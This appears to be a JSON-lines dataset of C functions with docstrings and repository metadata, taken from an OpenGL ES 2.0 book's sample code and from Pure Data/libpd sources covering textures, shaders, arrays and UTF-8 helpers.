{"docstring": "///\n// Create a mipmapped 2D texture image \n//\n", "func_signal": "GLuint CreateTexture2D( )", "code": "{\n   // Texture object handle\n   GLuint textureId;\n   int    width = 256,\n          height = 256;\n   GLubyte *pixels;\n      \n   pixels = GenCheckImage( width, height, 64 );\n   if ( pixels == NULL )\n      return 0;\n\n   // Generate a texture object\n   glGenTextures ( 1, &textureId );\n\n   // Bind the texture object\n   glBindTexture ( GL_TEXTURE_2D, textureId );\n\n   // Load mipmap level 0\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, width, height, \n                  0, GL_RGB, GL_UNSIGNED_BYTE, pixels );\n   \n   // Set the filtering mode\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );\n\n   return textureId;\n\n}", "path": "LinuxX11\\Chapter_9\\TextureWrap\\TextureWrap.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Initialize the shader and program object\n//\n", "func_signal": "int Init ( ESContext *esContext )", "code": "{\n   esContext->userData = malloc(sizeof(UserData));\n\t\n   UserData *userData = esContext->userData;\n   GLbyte vShaderStr[] =\n      \"uniform float u_offset;      \\n\"\n      \"attribute vec4 a_position;   \\n\"\n      \"attribute vec2 a_texCoord;   \\n\"\n      \"varying vec2 v_texCoord;     \\n\"\n      \"void main()                  \\n\"\n      \"{                            \\n\"\n      \"   gl_Position = a_position; \\n\"\n      \"   gl_Position.x += u_offset;\\n\"\n      \"   v_texCoord = a_texCoord;  \\n\"\n      \"}                            \\n\";\n   \n   GLbyte fShaderStr[] =  \n      \"precision mediump float;                            \\n\"\n      \"varying vec2 v_texCoord;                            \\n\"\n      \"uniform sampler2D s_texture;                        \\n\"\n      \"void main()                                         \\n\"\n      \"{                                                   \\n\"\n      \"  gl_FragColor = texture2D( s_texture, v_texCoord );\\n\"\n      \"}                                                   \\n\";\n\n   // Load the shaders and get a linked program object\n   userData->programObject = esLoadProgram ( vShaderStr, fShaderStr );\n\n   // Get the attribute locations\n   userData->positionLoc = glGetAttribLocation ( userData->programObject, \"a_position\" );\n   userData->texCoordLoc = glGetAttribLocation ( userData->programObject, \"a_texCoord\" );\n   \n   // Get the sampler location\n   userData->samplerLoc = glGetUniformLocation ( userData->programObject, \"s_texture\" );\n\n   // Get the offset location\n   userData->offsetLoc = glGetUniformLocation( userData->programObject, \"u_offset\" );\n\n   // Load the texture\n   userData->textureId = CreateTexture2D ();\n\n   glClearColor ( 0.0f, 0.0f, 0.0f, 0.0f );\n   return GL_TRUE;\n}", "path": "LinuxX11\\Chapter_9\\TextureWrap\\TextureWrap.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Cleanup\n//\n", "func_signal": "void ShutDown ( ESContext *esContext )", "code": "{\n   UserData *userData = esContext->userData;\n\n   // Delete texture object\n   glDeleteTextures ( 1, &userData->textureId );\n\n   // Delete program object\n   glDeleteProgram ( userData->programObject );\n}", "path": "LinuxX11\\Chapter_13\\ParticleSystem\\ParticleSystem.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n//  Generate an RGB8 checkerboard image\n//\n", "func_signal": "GLubyte* GenCheckImage( int width, int height, int checkSize )", "code": "{\n   int x,\n       y;\n   GLubyte *pixels = malloc( width * height * 3 );\n   \n   if ( pixels == NULL )\n      return NULL;\n\n   for ( y = 0; y < height; y++ )\n      for ( x = 0; x < width; x++ )\n      {\n         GLubyte rColor = 0;\n         GLubyte bColor = 0;\n\n         if ( ( x / checkSize ) % 2 == 0 )\n         {\n            rColor = 255 * ( ( y / checkSize ) % 2 );\n            bColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n         else\n         {\n            bColor = 255 * ( ( y / checkSize ) % 2 );\n            rColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n\n         pixels[(y * height + x) * 3] = rColor;\n         pixels[(y * height + x) * 3 + 1] = 0;\n         pixels[(y * height + x) * 3 + 2] = bColor; \n      } \n\n   return pixels;\n}", "path": "LinuxX11\\Chapter_9\\MipMap2D\\MipMap2D.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n//  esCreateWindow()\n//\n//      title - name for title bar of window\n//      width - width of window to create\n//      height - height of window to create\n//      flags  - bitwise or of window creation flags \n//          ES_WINDOW_ALPHA       - specifies that the framebuffer should have alpha\n//          ES_WINDOW_DEPTH       - specifies that a depth buffer should be created\n//          ES_WINDOW_STENCIL     - specifies that a stencil buffer should be created\n//          ES_WINDOW_MULTISAMPLE - specifies that a multi-sample buffer should be created\n//\n", "func_signal": "GLboolean ESUTIL_API esCreateWindow ( ESContext *esContext, const char* title, GLint width, GLint height, GLuint flags )", "code": "{\n   EGLint attribList[] =\n   {\n       EGL_RED_SIZE,       5,\n       EGL_GREEN_SIZE,     6,\n       EGL_BLUE_SIZE,      5,\n       EGL_ALPHA_SIZE,     (flags & ES_WINDOW_ALPHA) ? 8 : EGL_DONT_CARE,\n       EGL_DEPTH_SIZE,     (flags & ES_WINDOW_DEPTH) ? 8 : EGL_DONT_CARE,\n       EGL_STENCIL_SIZE,   (flags & ES_WINDOW_STENCIL) ? 8 : EGL_DONT_CARE,\n       EGL_SAMPLE_BUFFERS, (flags & ES_WINDOW_MULTISAMPLE) ? 1 : 0,\n       EGL_NONE\n   };\n   \n   if ( esContext == NULL )\n   {\n      return GL_FALSE;\n   }\n\n   esContext->width = width;\n   esContext->height = height;\n\n   if ( !WinCreate ( esContext, title) )\n   {\n      return GL_FALSE;\n   }\n\n  \n   if ( !CreateEGLContext ( esContext->hWnd,\n                            &esContext->eglDisplay,\n                            &esContext->eglContext,\n                            &esContext->eglSurface,\n                            attribList) )\n   {\n      return GL_FALSE;\n   }\n   \n\n   return GL_TRUE;\n}", "path": "Windows\\Common\\Source\\esUtil.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// esLoadTGA()\n//\n//    Loads a 24-bit TGA image from a file\n//\n", "func_signal": "char* ESUTIL_API esLoadTGA ( char *fileName, int *width, int *height )", "code": "{\n   char *buffer;\n\n   if ( WinTGALoad ( fileName, &buffer, width, height ) )\n   {\n      return buffer;\n   }\n\n   return NULL;\n}", "path": "Windows\\Common\\Source\\esUtil.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "//\n///\n/// \\brief Load a vertex and fragment shader, create a program object, link program.\n//         Errors output to log.\n/// \\param vertShaderSrc Vertex shader source code\n/// \\param fragShaderSrc Fragment shader source code\n/// \\return A new program object linked with the vertex/fragment shader pair, 0 on failure\n//\n", "func_signal": "GLuint ESUTIL_API esLoadProgram(const char *vertShaderSrc, const char *fragShaderSrc)", "code": "{\n    GLuint vertexShader;\n    GLuint fragmentShader;\n    GLuint programObject;\n    GLint linked;\n\n    // Load the vertex/fragment shaders\n    vertexShader = esLoadShader(GL_VERTEX_SHADER, vertShaderSrc);\n    if (vertexShader == 0)\n        return 0;\n\n    fragmentShader = esLoadShader(GL_FRAGMENT_SHADER, fragShaderSrc);\n    if (fragmentShader == 0)\n    {\n        glDeleteShader(vertexShader);\n        return 0;\n    }\n\n    // Create the program object\n    programObject = glCreateProgram();\n\n    if (programObject == 0)\n        return 0;\n\n    glAttachShader(programObject, vertexShader);\n    glAttachShader(programObject, fragmentShader);\n\n    // Link the program\n    glLinkProgram(programObject);\n\n    // Check the link status\n    glGetProgramiv(programObject, GL_LINK_STATUS, &linked);\n\n    if (!linked)\n    {\n        GLint infoLen = 0;\n\n        glGetProgramiv(programObject, GL_INFO_LOG_LENGTH, &infoLen);\n\n        if (infoLen > 1)\n        {\n            char* infoLog = malloc(sizeof(char) * infoLen);\n\n            glGetProgramInfoLog(programObject, infoLen, NULL, infoLog);\n            esLogMessage(\"Error linking program:\\n%s\\n\", infoLog);\n\n            free(infoLog);\n        }\n\n        glDeleteProgram(programObject);\n        return 0;\n    }\n\n    // Free up no longer needed shader resources\n    glDeleteShader(vertexShader);\n    glDeleteShader(fragmentShader);\n\n    return programObject;\n}", "path": "BlackBerry\\Common\\src\\esShader.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n//  Generate an RGB8 checkerboard image\n//\n", "func_signal": "GLubyte* GenCheckImage( int width, int height, int checkSize )", "code": "{\n   int x,\n       y;\n   GLubyte *pixels = malloc( width * height * 3 );\n   \n   if ( pixels == NULL )\n      return NULL;\n\n   for ( y = 0; y < height; y++ )\n      for ( x = 0; x < width; x++ )\n      {\n         GLubyte rColor = 0;\n         GLubyte bColor = 0;\n\n         if ( ( x / checkSize ) % 2 == 0 )\n         {\n            rColor = 255 * ( ( y / checkSize ) % 2 );\n            bColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n         else\n         {\n            bColor = 255 * ( ( y / checkSize ) % 2 );\n            rColor = 255 * ( 1 - ( ( y / checkSize ) % 2 ) );\n         }\n\n         pixels[(y * height + x) * 3] = rColor;\n         pixels[(y * height + x) * 3 + 1] = 0;\n         pixels[(y * height + x) * 3 + 2] = bColor; \n      } \n\n   return pixels;\n}", "path": "LinuxX11\\Chapter_9\\TextureWrap\\TextureWrap.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n// Load texture from disk\n//\n", "func_signal": "GLuint LoadTexture ( char *fileName )", "code": "{\n   int width,\n       height;\n   char *buffer = esLoadTGA ( fileName, &width, &height );\n   GLuint texId;\n\n   if ( buffer == NULL )\n   {\n      esLogMessage ( \"Error loading (%s) image.\\n\", fileName );\n      return 0;\n   }\n\n   glGenTextures ( 1, &texId );\n   glBindTexture ( GL_TEXTURE_2D, texId );\n\n   glTexImage2D ( GL_TEXTURE_2D, 0, GL_RGB, width, height, 0, GL_RGB, GL_UNSIGNED_BYTE, buffer );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE );\n   glTexParameteri ( GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE );\n\n   free ( buffer );\n\n   return texId;\n}", "path": "LinuxX11\\Chapter_13\\ParticleSystem\\ParticleSystem.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "///\n//  esInitContext()\n//\n//      Initialize ES utility context.  This must be called before calling any other\n//      functions.\n//\n", "func_signal": "void ESUTIL_API esInitContext ( ESContext *esContext )", "code": "{\n   if ( esContext != NULL )\n   {\n      memset( esContext, 0, sizeof( ESContext) );\n   }\n}", "path": "Windows\\Common\\Source\\esUtil.c", "repo_name": "nickdesaulniers/opengles2-book", "stars": 65, "license": "mit", "language": "c", "size": 7268}
{"docstring": "/* Pure arrays have no a priori graphical capabilities.\nThey are instantiated by \"garrays\" below or can be elements of other\nscalars (g_scalar.c); their graphical behavior is defined accordingly. */\n", "func_signal": "t_array *array_new(t_symbol *templatesym, t_gpointer *parent)", "code": "{\n    t_array *x = (t_array *)getbytes(sizeof (*x));\n    t_template *template;\n    t_gpointer *gp;\n    template = template_findbyname(templatesym);\n    x->a_templatesym = templatesym;\n    x->a_n = 1;\n    x->a_elemsize = sizeof(t_word) * template->t_n;\n    x->a_vec = (char *)getbytes(x->a_elemsize);\n        /* note here we blithely copy a gpointer instead of \"setting\" a\n        new one; this gpointer isn't accounted for and needn't be since\n        we'll be deleted before the thing pointed to gets deleted anyway;\n        see array_free. */\n    x->a_gp = *parent;\n    x->a_stub = gstub_new(0, x);\n    word_init((t_word *)(x->a_vec), template, parent);\n    return (x);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/*------------------- Pd messages ------------------------ */\n", "func_signal": "static void garray_const(t_garray *x, t_floatarg g)", "code": "{\n    int yonset, i, elemsize;\n    t_array *array = garray_getarray_floatonly(x, &yonset, &elemsize);\n    if (!array)\n        error(\"%s: needs floating-point 'y' field\", x->x_realname->s_name);\n    else for (i = 0; i < array->a_n; i++)\n        *((t_float *)((char *)array->a_vec\n            + elemsize * i) + yonset) = g;\n    garray_redraw(x);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* LATER move this and others back into plot parentwidget code, so\n    they can be static (look in g_canvas.h for candidates). */\n", "func_signal": "int array_doclick(t_array *array, t_glist *glist, t_scalar *sc, t_array *ap,\n    t_symbol *elemtemplatesym,\n    t_float linewidth, t_float xloc, t_float xinc, t_float yloc, t_float scalarvis,\n    t_fielddesc *xfield, t_fielddesc *yfield, t_fielddesc *wfield,\n    int xpix, int ypix, int shift, int alt, int dbl, int doit)", "code": "{\n    t_canvas *elemtemplatecanvas;\n    t_template *elemtemplate;\n    int elemsize, yonset, wonset, xonset, i;\n\n    if (!array_getfields(elemtemplatesym, &elemtemplatecanvas,\n        &elemtemplate, &elemsize, xfield, yfield, wfield,\n        &xonset, &yonset, &wonset))\n    {\n        t_float best = 100;\n            /* if it has more than 2000 points, just check 1000 of them. */\n        int incr = (array->a_n <= 2000 ? 1 : array->a_n / 1000);\n        for (i = 0; i < array->a_n; i += incr)\n        {\n            t_float pxpix, pypix, pwpix, dx, dy;\n            array_getcoordinate(glist, (char *)(array->a_vec) + i * elemsize,\n                xonset, yonset, wonset, i, xloc, yloc, xinc,\n                xfield, yfield, wfield, &pxpix, &pypix, &pwpix);\n            if (pwpix < 4)\n                pwpix = 4;\n            dx = pxpix - xpix;\n            if (dx < 0) dx = -dx;\n            if (dx > 8)\n                continue;   \n            dy = pypix - ypix;\n            if (dy < 0) dy = -dy;\n            if (dx + dy < best)\n                best = dx + dy;\n            if (wonset >= 0)\n            {\n                dy = (pypix + pwpix) - ypix;\n                if (dy < 0) dy = -dy;\n                if (dx + dy < best)\n                    best = dx + dy;\n                dy = (pypix - pwpix) - ypix;\n                if (dy < 0) dy = -dy;\n                if (dx + dy < best)\n                    best = dx + dy;\n            }\n        }\n        if (best > 8)\n        {\n            if (scalarvis != 0)\n                return (array_doclick_element(array, glist, sc, ap,\n                    elemtemplatesym, linewidth, xloc, xinc, yloc,\n                        xfield, yfield, wfield,\n                        xpix, ypix, shift, alt, dbl, doit));\n            else return (0);\n        }\n        best += 0.001;  /* add truncation error margin */\n        for (i = 0; i < array->a_n; i += incr)\n        {\n            t_float pxpix, pypix, pwpix, dx, dy, dy2, dy3;\n            array_getcoordinate(glist, (char *)(array->a_vec) + i * elemsize,\n                xonset, yonset, wonset, i, xloc, yloc, xinc,\n                xfield, yfield, wfield, &pxpix, &pypix, &pwpix);\n            if (pwpix < 4)\n                pwpix = 4;\n            dx = pxpix - xpix;\n            if (dx < 0) dx = -dx;\n            dy = pypix - ypix;\n            if (dy < 0) dy = -dy;\n            if (wonset >= 0)\n            {\n                dy2 = (pypix + pwpix) - ypix;\n                if (dy2 < 0) dy2 = -dy2;\n                dy3 = (pypix - pwpix) - ypix;\n                if (dy3 < 0) dy3 = -dy3;\n                if (yonset < 0)\n                    dy = 100;\n            }\n            else dy2 = dy3 = 100;\n            if (dx + dy <= best || dx + dy2 <= best || dx + dy3 <= best)\n            {\n                if (dy < dy2 && dy < dy3)\n                    array_motion_fatten = 0;\n                else if (dy2 < dy3)\n                    array_motion_fatten = -1;\n                else array_motion_fatten = 1;\n                if (doit)\n                {\n                    char *elem = (char *)array->a_vec;\n                    array_motion_elemsize = elemsize;\n                    array_motion_glist = glist;\n                    array_motion_scalar = sc;\n                    array_motion_array = ap;\n                    array_motion_template = elemtemplate;\n                    array_motion_xperpix = glist_dpixtodx(glist, 1);\n                    array_motion_yperpix = glist_dpixtody(glist, 1);\n                    if (alt && xpix < pxpix) /* delete a point */\n                    {\n                        if (array->a_n <= 1)\n                            return (0);\n                        memmove((char *)(array->a_vec) + elemsize * i, \n                            (char *)(array->a_vec) + elemsize * (i+1),\n                                (array->a_n - 1 - i) * elemsize);\n                        array_resize_and_redraw(array, glist, array->a_n - 1);\n                        return (0);\n                    }\n                    else if (alt)\n                    {\n                        /* add a point (after the clicked-on one) */\n                        array_resize_and_redraw(array, glist, array->a_n + 1);\n                        elem = (char *)array->a_vec;\n                        memmove(elem + elemsize * (i+1), \n                            elem + elemsize * i,\n                                (array->a_n - i - 1) * elemsize);\n                        i++;\n                    }\n                    if (xonset >= 0)\n                    {\n                        array_motion_xfield = xfield;\n                        array_motion_xcumulative = \n                            fielddesc_getcoord(xfield, array_motion_template,\n                                (t_word *)(elem + i * elemsize), 1);\n                            array_motion_wp = (t_word *)(elem + i * elemsize);\n                        if (shift)\n                            array_motion_npoints = array->a_n - i;\n                        else array_motion_npoints = 1;\n                    }\n                    else\n                    {\n                        array_motion_xfield = 0;\n                        array_motion_xcumulative = 0;\n                        array_motion_wp = (t_word *)elem;\n                        array_motion_npoints = array->a_n;\n\n                        array_motion_initx = i;\n                        array_motion_lastx = i;\n                        array_motion_xperpix *= (xinc == 0 ? 1 : 1./xinc);\n                    }\n                    if (array_motion_fatten)\n                    {\n                        array_motion_yfield = wfield;\n                        array_motion_ycumulative = \n                            fielddesc_getcoord(wfield, array_motion_template,\n                                (t_word *)(elem + i * elemsize), 1);\n                        array_motion_yperpix *= -array_motion_fatten;\n                    }\n                    else if (yonset >= 0)\n                    {\n                        array_motion_yfield = yfield;\n                        array_motion_ycumulative = \n                            fielddesc_getcoord(yfield, array_motion_template,\n                                (t_word *)(elem + i * elemsize), 1);\n                            /* *(t_float *)((elem + elemsize * i) + yonset); */\n                    }\n                    else\n                    {\n                        array_motion_yfield = 0;\n                        array_motion_ycumulative = 0;\n                    }\n                    glist_grab(glist, 0, array_motion, 0, xpix, ypix);\n                }\n                if (alt)\n                {\n                    if (xpix < pxpix)\n                        return (CURSOR_EDITMODE_DISCONNECT);\n                    else return (CURSOR_RUNMODE_ADDPOINT);\n                }\n                else return (array_motion_fatten ?\n                    CURSOR_RUNMODE_THICKEN : CURSOR_RUNMODE_CLICKME);\n            }\n        }   \n    }\n    return (0);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* get the array's name.  Return nonzero if it should be hidden */\n", "func_signal": "int garray_getname(t_garray *x, t_symbol **namep)", "code": "{\n    *namep = x->x_name;\n    return (x->x_hidename);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* try clicking on an element of the array as a scalar (if clicking\n    on the trace of the array failed) */\n", "func_signal": "static int array_doclick_element(t_array *array, t_glist *glist,\n    t_scalar *sc, t_array *ap,\n    t_symbol *elemtemplatesym,\n    t_float linewidth, t_float xloc, t_float xinc, t_float yloc,\n    t_fielddesc *xfield, t_fielddesc *yfield, t_fielddesc *wfield,\n    int xpix, int ypix, int shift, int alt, int dbl, int doit)", "code": "{\n    t_canvas *elemtemplatecanvas;\n    t_template *elemtemplate;\n    int elemsize, yonset, wonset, xonset, i, incr, hit;\n    t_float xsum;\n\n    if (elemtemplatesym == &s_float)\n        return (0);\n    if (array_getfields(elemtemplatesym, &elemtemplatecanvas,\n        &elemtemplate, &elemsize, xfield, yfield, wfield,\n            &xonset, &yonset, &wonset))\n                return (0);\n        /* if it has more than 2000 points, just check 300 of them. */\n    if (array->a_n < 2000)\n        incr = 1;\n    else incr = array->a_n / 300;\n    for (i = 0, xsum = 0; i < array->a_n; i += incr)\n    {\n        t_float usexloc, useyloc;\n        if (xonset >= 0)\n            usexloc = xloc + fielddesc_cvttocoord(xfield, \n                *(t_float *)(((char *)(array->a_vec) + elemsize * i) + xonset));\n        else usexloc = xloc + xsum, xsum += xinc;\n        useyloc = yloc + (yonset >= 0 ? fielddesc_cvttocoord(yfield,\n            *(t_float *)(((char *)(array->a_vec) + elemsize * i) + yonset)) : 0);\n        \n        if (hit = scalar_doclick(\n            (t_word *)((char *)(array->a_vec) + i * elemsize),\n            elemtemplate, 0, array,\n            glist, usexloc, useyloc,\n            xpix, ypix, shift, alt, dbl, doit))\n                return (hit);\n    }\n    return (0);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* get a garray's \"array\" structure. */\n", "func_signal": "t_array *garray_getarray(t_garray *x)", "code": "{\n    int nwords, zonset, ztype;\n    t_symbol *zarraytype;\n    t_scalar *sc = x->x_scalar;\n    t_symbol *templatesym = sc->sc_template;\n    t_template *template = template_findbyname(templatesym);\n    if (!template)\n    {\n        error(\"array: couldn't find template %s\", templatesym->s_name);\n        return (0);\n    }\n    if (!template_find_field(template, gensym(\"z\"), \n        &zonset, &ztype, &zarraytype))\n    {\n        error(\"array: template %s has no 'z' field\", templatesym->s_name);\n        return (0);\n    }\n    if (ztype != DT_ARRAY)\n    {\n        error(\"array: template %s, 'z' field is not an array\",\n            templatesym->s_name);\n        return (0);\n    }\n    return (sc->sc_vec[zonset].w_array);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* routine that checks if we're just an array of floats and if\n    so returns the goods */\n", "func_signal": "int garray_getfloatwords(t_garray *x, int *size, t_word **vec)", "code": "{\n    int yonset, type, elemsize;\n    t_array *a = garray_getarray_floatonly(x, &yonset, &elemsize);\n    if (!a)\n    {\n        error(\"%s: needs floating-point 'y' field\", x->x_realname->s_name);\n        return (0);\n    }\n    else if (elemsize != sizeof(t_word))\n    {\n        error(\"%s: has more than one field\", x->x_realname->s_name);\n        return (0);\n    }\n    *size = garray_npoints(x);\n    *vec =  (t_word *)garray_vec(x);\n    return (1);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* called from graph_dialog to set properties */\n", "func_signal": "void garray_properties(t_garray *x)", "code": "{\n    char cmdbuf[200];\n    t_array *a = garray_getarray(x);\n    t_scalar *sc = x->x_scalar;\n\n    if (!a)\n        return;\n    gfxstub_deleteforkey(x);\n        /* create dialog window.  LATER fix this to escape '$'\n        properly; right now we just detect a leading '$' and escape\n        it.  There should be a systematic way of doing this. */\n    sprintf(cmdbuf, ((x->x_name->s_name[0] == '$') ?\n        \"pdtk_array_dialog %%s \\\\%s %d %d 0\\n\" :\n        \"pdtk_array_dialog %%s %s %d %d 0\\n\"),\n            x->x_name->s_name, a->a_n, x->x_saveit + \n            2 * (int)(template_getfloat(template_findbyname(sc->sc_template),\n            gensym(\"style\"), x->x_scalar->sc_vec, 1)));\n    gfxstub_new(&x->x_gobj.g_pd, x, cmdbuf);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* set the \"saveit\" flag */\n", "func_signal": "void garray_setsaveit(t_garray *x, int saveit)", "code": "{\n    if (x->x_saveit && !saveit)\n        post(\"warning: array %s: clearing save-in-patch flag\",\n            x->x_name->s_name);\n    x->x_saveit = saveit;\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* charnum => byte offset */\n", "func_signal": "int u8_offset(char *str, int charnum)", "code": "{\n    int offs=0;\n\n    while (charnum > 0 && str[offs]) {\n        (void)(isutf(str[++offs]) || isutf(str[++offs]) ||\n               isutf(str[++offs]) || ++offs);\n        charnum--;\n    }\n    return offs;\n}", "path": "android-libpd\\jni\\libpd\\pure-data\\src\\s_utf8.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* create invisible, built-in canvases to determine the templates for floats\nand float-arrays. */\n", "func_signal": "void garray_init( void)", "code": "{\n    t_binbuf *b;\n    if (garray_arraytemplatecanvas)\n        return;\n    b = binbuf_new();\n    \n    glob_setfilename(0, gensym(\"_float\"), gensym(\".\"));\n    binbuf_text(b, garray_floattemplatefile, strlen(garray_floattemplatefile));\n    binbuf_eval(b, 0, 0, 0);\n    vmess(s__X.s_thing, gensym(\"pop\"), \"i\", 0);\n    \n    glob_setfilename(0, gensym(\"_float_array\"), gensym(\".\"));\n    binbuf_text(b, garray_arraytemplatefile, strlen(garray_arraytemplatefile));\n    binbuf_eval(b, 0, 0, 0);\n    garray_arraytemplatecanvas = s__X.s_thing;\n    vmess(s__X.s_thing, gensym(\"pop\"), \"i\", 0);\n\n    glob_setfilename(0, &s_, &s_);\n    binbuf_free(b);  \n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* change the name of a garray. */\n", "func_signal": "static void garray_rename(t_garray *x, t_symbol *s)", "code": "{\n    /* jsarlo { */\n    if (x->x_listviewing)\n    {\n        garray_arrayviewlist_close(x);\n    }\n    /* } jsarlo */\n    pd_unbind(&x->x_gobj.g_pd, x->x_realname);\n    pd_bind(&x->x_gobj.g_pd, x->x_realname = x->x_name = s);\n    garray_redraw(x);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/*-- moo --*/\n", "func_signal": "void u8_dec_ptr(char **sp)", "code": "{\n  (void)(isutf(*(--(*sp))) || isutf(*(--(*sp))) ||\n         isutf(*(--(*sp))) || --(*sp));\n}", "path": "android-libpd\\jni\\libpd\\pure-data\\src\\s_utf8.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* srcsz = number of source characters, or -1 if 0-terminated\n   sz = size of dest buffer in bytes\n\n   returns # characters converted\n   dest will only be '\\0'-terminated if there is enough space. this is\n   for consistency; imagine there are 2 bytes of space left, but the next\n   character requires 3 bytes. in this case we could NUL-terminate, but in\n   general we can't when there's insufficient space. therefore this function\n   only NUL-terminates if all the characters fit, and there's space for\n   the NUL as well.\n   the destination string will never be bigger than the source string.\n*/\n", "func_signal": "int u8_toutf8(char *dest, int sz, u_int32_t *src, int srcsz)", "code": "{\n    u_int32_t ch;\n    int i = 0;\n    char *dest_end = dest + sz;\n\n    while (srcsz<0 ? src[i]!=0 : i < srcsz) {\n        ch = src[i];\n        if (ch < 0x80) {\n            if (dest >= dest_end)\n                return i;\n            *dest++ = (char)ch;\n        }\n        else if (ch < 0x800) {\n            if (dest >= dest_end-1)\n                return i;\n            *dest++ = (ch>>6) | 0xC0;\n            *dest++ = (ch & 0x3F) | 0x80;\n        }\n        else if (ch < 0x10000) {\n            if (dest >= dest_end-2)\n                return i;\n            *dest++ = (ch>>12) | 0xE0;\n            *dest++ = ((ch>>6) & 0x3F) | 0x80;\n            *dest++ = (ch & 0x3F) | 0x80;\n        }\n        else if (ch < 0x110000) {\n            if (dest >= dest_end-3)\n                return i;\n            *dest++ = (ch>>18) | 0xF0;\n            *dest++ = ((ch>>12) & 0x3F) | 0x80;\n            *dest++ = ((ch>>6) & 0x3F) | 0x80;\n            *dest++ = (ch & 0x3F) | 0x80;\n        }\n        i++;\n    }\n    if (dest < dest_end)\n        *dest = '\\0';\n    return i;\n}", "path": "android-libpd\\jni\\libpd\\pure-data\\src\\s_utf8.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* CHECKED case of f1 > f2:  x <= f2 => f1, x > f2 => f2\n   (Pd implementation of clip has it the other way around) */\n", "func_signal": "static void clip_float(t_clip *x, t_float f)", "code": "{\n    outlet_float(((t_object *)x)->ob_outlet,\n\t\t (f > x->x_f2 ? x->x_f2 : (f < x->x_f1 ? x->x_f1 : f)));\n}", "path": "android-libpd\\jni\\libpd\\pure-data\\extra\\cyclone\\hammer\\Clip.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
{"docstring": "/* this is called back from the dialog window to create a garray. \n    The otherflag requests that we find an existing graph to put it in. */\n", "func_signal": "void glist_arraydialog(t_glist *parent, t_symbol *name, t_floatarg size,\n    t_floatarg fflags, t_floatarg otherflag)", "code": "{\n    t_glist *gl;\n    t_garray *a;\n    int flags = fflags;\n    if (size < 1)\n        size = 1;\n    if (otherflag == 0 || (!(gl = glist_findgraph(parent))))\n        gl = glist_addglist(parent, &s_, 0, 1,\n            (size > 1 ? size-1 : size), -1, 0, 0, 0, 0);\n    a = graph_array(gl, sharptodollar(name), &s_float, size, flags);\n    canvas_dirty(parent, 1);\n}", "path": "ios-libpd\\src\\g_array.c", "repo_name": "hagish/kalimba", "stars": 91, "license": "other", "language": "c", "size": 5704}
